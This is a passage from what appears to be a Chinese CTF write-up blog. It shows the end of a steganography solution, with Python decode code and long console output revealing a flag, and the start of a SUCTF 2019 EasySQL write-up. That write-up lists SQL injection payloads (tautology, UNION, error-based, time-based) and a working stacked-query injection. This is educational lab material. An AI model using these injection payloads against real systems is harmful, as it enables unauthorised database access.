class="hljs-number">8</span>):<br>        res_str += chr(int(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res_str<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve_stego()<br></code></pre></td></tr></table></figure>

<p>运行效果：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS</span> C:\Users\Administrator\Downloads\tmp\近在眼前&gt; python<span class="hljs-number">2</span> .\test.py<br><span class="hljs-attribute">1</span><br><br><span class="hljs-attribute">0</span><br><br><span class="hljs-attribute">5</span><br><span class="hljs-attribute">A</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">A</span><br><span class="hljs-attribute">13</span><br><span class="hljs-attribute">AC</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">AC</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">AC</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACT</span><br><span class="hljs-attribute">4</span><br><span class="hljs-attribute">ACT</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACT</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ACTF</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span><br><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ACTF</span><br><span class="hljs-attribute">11</span><br><span class="hljs-attribute">ACTF</span>&#123;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<br><span class="hljs-attribute">13</span><br><span class="hljs-attribute">ACTF</span>&#123;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span><br><span class="hljs-attribute">8</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>a<br><span class="hljs-attribute">7</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>a<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>a<br><span class="hljs-attribute">13</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>as<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>as<br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>as<br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>as<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>as<br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>ase<br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>ase<br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>ase<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>ase<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>ase<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>ase<br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<br><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span><br><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span><br><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_<br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_<br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_<br><span class="hljs-attribute">6</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<br><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<br><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">3</span><br><span class="hljs-attribute">12</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span><br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!<br><span class="hljs-attribute">7</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!<br><span class="hljs-attribute">13</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">0</span><br><span class="hljs-attribute">ACTF</span>&#123;<span class="hljs-number">6</span>aseb<span class="hljs-number">4</span>_f<span class="hljs-number">33</span>!&#125;<br><span class="hljs-attribute">PS</span> C:\Users\Administrator\Downloads\tmp\近在眼前&gt;<br><br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>suctf 2019 EasySQL</title>
    <url>/2021/10/10/2021/nss/0/</url>
    <content><![CDATA[<p> 参考链接：</p>
<p>[<a href="https://www.cnblogs.com/peri0d/p/11598597.html">SUCTF 2019]EasySQL - peri0d - 博客园 (cnblogs.com)</a></p>
<p>[(4条消息) <a href="https://blog.csdn.net/m0_55771794/article/details/118709290">SUCTF 2019]EasySQL_m0_55771794的博客-CSDN博客</a></p>
<p>打开页面</p>
<p><img src="/2021/10/10/2021/nss/0/image-20211010193758035.png" alt="image-20211010193758035"></p>
<p>先试试基本的注入</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>&#x27;#	#or语句<br><span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">3</span>#	#order语句<br><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#	#联合查询<br><span class="hljs-number">1</span>&#x27;and(select extractvalue(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,(select database()))))	#报错注入<br><span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+	#时间注入<br></code></pre></td></tr></table></figure>

<p>结果都是下图</p>
<p><img src="/2021/10/10/2021/nss/0/image-20211010194231781.png" alt="image-20211010194231781"></p>
<p>试到堆叠注入时成功了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1;<span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/10/2021/nss/0/image-20211010194353961.png" alt="image-20211010194353961"></p>
<p>继续</p>
